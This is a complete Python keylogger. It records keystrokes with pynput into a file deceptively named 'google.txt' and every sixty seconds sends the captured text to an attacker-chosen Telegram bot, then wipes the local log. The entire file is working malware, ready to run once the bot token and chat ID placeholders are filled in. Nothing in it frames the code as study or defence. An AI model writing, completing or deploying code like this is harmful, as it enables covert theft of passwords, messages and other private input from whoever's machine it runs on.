import logging
from pynput import keyboard
import requests
from threading import Timer

# Configuration
LOG_FILE = "google.txt"
TELEGRAM_BOT_TOKEN = "Enter Your Bot Token ID"
TELEGRAM_CHAT_ID = "Enter Your Chat ID"
SEND_INTERVAL = 60  # Send logs every 60 seconds

# Initialize a buffer to store the current line
current_line = ""

# Function to write to log file
def write_to_log(content):
    with open(LOG_FILE, "a") as file:
        file.write(content)

# Function to handle key presses
def on_press(key):
    global current_line
    try:
        # Check if the key is a printable character
        if hasattr(key, "char") and key.char is not None:
            current_line += key.char
        elif key == keyboard.Key.space:
            current_line += " "
        elif key == keyboard.Key.enter:
            write_to_log(current_line + "\n")  # Write the line to the file
            current_line = ""  # Reset the buffer for the next line
        else:
            pass  # Ignore other keys for simplicity
    except Exception as e:
        logging.error(f"Error processing key press: {e}")

# Function to send logs to Telegram
def send_logs_to_telegram():
    try:
        with open(LOG_FILE, "r") as file:
            logs = file.read()

        if logs.strip():  # Send only if there are logs
            message = f"Keylogger Logs:\n{logs}"
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
            response = requests.post(url, data=payload)

            if response.status_code == 200:
                # Clear the log file after successful send
                open(LOG_FILE, "w").close()
            else:
                logging.error(f"Failed to send logs: {response.status_code}, {response.text}")
    except Exception as e:
        logging.error(f"Error sending logs to Telegram: {e}")

    # Schedule the next log send
    Timer(SEND_INTERVAL, send_logs_to_telegram).start()

# Start the keylogger
def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    send_logs_to_telegram()  # Start the log sending loop

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
